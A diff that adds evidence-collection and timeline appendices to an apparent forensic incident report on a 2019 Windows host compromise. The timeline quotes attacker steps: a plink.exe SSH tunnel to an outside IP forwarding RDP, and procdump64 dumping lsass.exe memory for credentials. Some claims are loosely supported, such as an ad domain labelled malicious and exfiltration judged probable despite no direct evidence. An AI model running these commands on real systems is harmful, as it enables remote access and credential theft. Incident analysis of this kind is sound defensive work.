@@ -361,3 +361,85 @@ Given the attacker's persistent access to the system and their ability to contro
 The attacker likely exfiltrated critical data from the host, including plaintext credentials from the `lsass.dmp` file and potentially other sensitive documents through the established SSH tunnel. The use of `Procdump` to extract memory from `lsass.exe` provided the attacker with the means to harvest authentication credentials, which could be used for further attacks or sold on the dark web. The SSH tunnel established by `plink.exe` facilitated secure, encrypted communication, likely used for both remote control and data exfiltration. Given the evidence, it is highly probable that the attacker was able to exfiltrate valuable information, posing a significant threat to the security of the compromised network.
 
 ---
+# **Appendix A: Evidence Collection**
+
+---
+
+#### **1. Digital Evidence Provided**
+
+This section outlines the digital evidence that was provided for the forensic investigation. The evidence consists of a disk image, a memory dump, and a network capture, each of which was carefully examined to ensure its integrity before analysis began.
+
+##### **1.1 Disk Image**
+
+- **File Name:** `disk.raw`
+- **Description:** This disk image was captured from the compromised host. It contains all the files, directories, and system data that were present on the system at the time of the compromise.
+- **Size:** 64,424,509,440 bytes
+- **Hash Values:**
+  - **MD5:** 2b915dce79a187582dc895445145b7a4
+  - **SHA1:** 945a8f34607ab9c1c7bb83b7e15f49445e10176b
+
+##### **1.2 Memory Dump**
+
+- **File Name:** `memory.raw`
+- **Description:** The memory dump contains a snapshot of the system’s RAM, which includes all running processes, loaded modules, and other volatile data at the time of capture.
+- **Size:** 5,368,709,120 bytes
+- **Hash Values:**
+  - **MD5:** 097d77c63543d77a685f4223f1d2f3a8
+  - **SHA1:** 36513325ca78989adc9140e03e42a2bc3c7f4db0
+
+##### **1.3 Network Capture**
+
+- **File Name:** `traffic.pcap`
+- **Description:** The network capture file contains the recorded network traffic that was transmitted and received by the compromised host during the period in question. This data was crucial for analyzing the communications between the compromised host and any potential Command and Control (C2) servers.
+- **Size:** 828,244,897 bytes
+- **Hash Values:**
+  - **MD5:** e6ad3e3c62e4599e127f2037567e90a1
+  - **SHA1:** 8087d05d41e0bcfdb63ba04051344b7b52d036e3
+
+---
+
+#### **2. Evidence Integrity Verification**
+
+Before any analysis was conducted, steps were taken to verify the integrity of the digital evidence to ensure that it had not been altered since it was collected.
+
+##### **2.1 Verification Process**
+
+1. **Hash Calculation:** The provided hash values (MD5 and SHA1) for each piece of evidence were recalculated using hashing tools. This was done to confirm that the evidence had not been tampered with after its initial acquisition.
+  
+2. **Comparison with Provided Hashes:** The calculated hashes were compared with the hashes provided by the client. A match between these hashes confirmed the integrity and authenticity of the digital evidence.
+  
+3. **Result:** All hash values matched the provided hashes, confirming that the evidence was intact and unaltered.
+
+---
+
+#### **3. Summary**
+
+The digital evidence provided was verified for integrity through hash comparison. The disk image, memory dump, and network capture were found to be authentic and unaltered, ensuring that the subsequent forensic analysis was based on accurate and reliable data.
+
+### **Appendix B: Timeline of Events**
+
+---
+
+This appendix provides a detailed, chronological timeline of the key events that occurred during the compromise of the client’s host. Each event is supported by specific pieces of evidence, including log files, network captures, and forensic analysis results.
+
+---
+
+#### **1. Timeline of Events**
+
+| **Date/Time (UTC)**            | **Event**                                                                                          | **Description**                                                                                                                                                         | **Supporting Evidence**                                                                                                                                                                       |
+|--------------------------------|----------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| **17/08/2019 05:38:43 AM**     | **Initial Web Browsing**                                                                            | The user "Alan" began browsing legitimate websites, including `washingtonpost.com` and `abc.net.au`.                                                                     | Browser History Log: `https://www.washingtonpost.com/` accessed at `05:38:46 AM`                                                                                                               |
+| **17/08/2019 05:38:56 AM**     | **Malicious Interaction with Ad Network**                                                          | The browser interacted with a script from `z.moatads.com`, a known malicious ad network. This initiated the attack by embedding malicious content within a legitimate site. | Browser History Log: `https://z.moatads.com/washpostprebidheader710741008563/yi.js` accessed at `05:38:56 AM`                                                                                   |
+| **17/08/2019 05:39:19 AM**     | **Redirection to `uploadfiles.io`**                                                                 | The user was redirected to `uploadfiles.io`, a malicious file-sharing site used to distribute malware.                                                                   | Browser History Log: `https://uploadfiles.io/hr4z39kn` accessed at `05:39:19 AM`                                                                                                               |
+| **17/08/2019 05:39:50 AM**     | **Download of `resume.doc.exe`**                                                                    | The malicious file `resume.doc.exe` was downloaded from `uploadfiles.io`.                                                                                                | Browser History Log: Download initiated from `https://uploadfiles.io/hr4z39kn` at `05:39:50 AM`                                                                                                 |
+| **17/08/2019 05:41:59 AM**     | **Execution of `resume.doc.exe`**                                                                   | The downloaded file `resume.doc.exe` was executed on the system, initiating the full compromise.                                                                         | File System Analysis: `resume.doc.exe` executed at `05:41:59 AM`, located at `C:\Users\Alan\Downloads\resume.doc.exe`                                                                            |
+| **17/08/2019 05:46:18 AM**     | **Execution of Malicious PowerShell Scripts**                                                       | A series of PowerShell scripts were executed, disabling security features and establishing persistence on the system.                                                    | PowerShell Logs: Execution of scripts `vagrant-shell.ps1`, `Sticky.ps1`, and `Service.ps1` between `05:46:18 AM` and `05:48:39 AM`                                                              |
+| **17/08/2019 05:49:18 AM**     | **Creation of Malicious `ScvHost` Service**                                                         | The `ScvHost` service was created to run `scvhost.exe`, a malicious backdoor executable, ensuring persistence on the system.                                             | Windows Event Log: Event ID 7045, Service Control Manager, Service Name: `ScvHost`, Service File Name: `C:\Users\Alan\AppData\Local\Temp\scvhost.exe`                                          |
+| **17/08/2019 05:49:18 AM - 05:49:48 AM** | **Execution and Concealment of `scvhost.exe`**                                                      | The `scvhost.exe` process (PID 1840) was executed, remaining active for 30 seconds. It used evasion techniques to avoid detection by some process enumeration tools.    | Memory Analysis: `pslist` and `psxview` outputs showing `scvhost.exe` running from `05:49:18 AM` to `05:49:48 AM`, partially hidden from `Psscan` and `Thrdproc` methods.                        |
+| **17/08/2019 05:52:31 AM**     | **Execution of `plink.exe` for SSH Tunnel Creation**                                               | The `plink.exe` tool was used to create an SSH tunnel, forwarding traffic from the compromised host to a remote IP address for potential remote desktop access.           | Memory Analysis: Command-line execution `plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389` detected in memory artifacts, along with loaded DLLs indicating encrypted operations. |
+| **17/08/2019 06:00:34 AM**     | **Execution of `procdump64.exe` for Credential Dumping**                                            | The `procdump64.exe` tool was executed to dump the memory of the `lsass.exe` process, likely capturing sensitive credentials.                                            | Prefetch Files: `PROCDUMP64.EXE-7C654F89.pf`, USN Journal Entries, and Jump Lists confirming execution and creation of `lsass.dmp` and `lsass.zip` at `06:00:34 AM`.                              |
+| **17/08/2019 - Unknown Time**  | **Potential Exfiltration via SSH Tunnel**                                                           | While no direct evidence of exfiltration was found, the SSH tunnel created by `plink.exe` could have been used to exfiltrate data such as `lsass.zip`.                    | Network Traffic Analysis: No direct evidence, but SSH tunnel and RDP forwarding to port `3389` indicate a high risk of data exfiltration.                                                         |
+
+---
+
+This timeline provides a comprehensive view of the key events during the compromise, linking each event to specific pieces of evidence that were discovered during the forensic investigation. Each entry is substantiated with detailed references to logs, file system changes, or memory analysis, offering a clear and traceable path through the entire attack sequence.
